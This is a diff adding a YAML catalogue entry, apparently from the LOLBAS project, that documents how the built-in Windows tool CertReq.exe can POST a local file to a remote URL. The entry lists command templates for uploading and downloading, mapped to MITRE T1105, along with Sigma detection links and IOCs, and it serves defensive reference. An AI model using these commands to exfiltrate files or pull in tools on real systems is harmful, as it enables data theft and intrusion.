@@ -1,0 +1,32 @@
+---
+Name: CertReq.exe
+Description: Used for requesting and managing certificates
+Author: David Middlehurst
+Created: 2020-07-07
+Commands:
+  - Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+    Description: Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).
+    Usecase: Download file from Internet
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+    Description: Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.
+    Usecase: Upload
+    Category: Upload
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\certreq.exe
+  - Path: C:\Windows\SysWOW64\certreq.exe
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
+  - IOC: certreq creates new files
+  - IOC: certreq makes POST requests
+Resources:
+  - Link: https://dtm.uk/certreq
+Acknowledgement:
+  - Person: David Middlehurst
+    Handle: '@dtmsecurity'
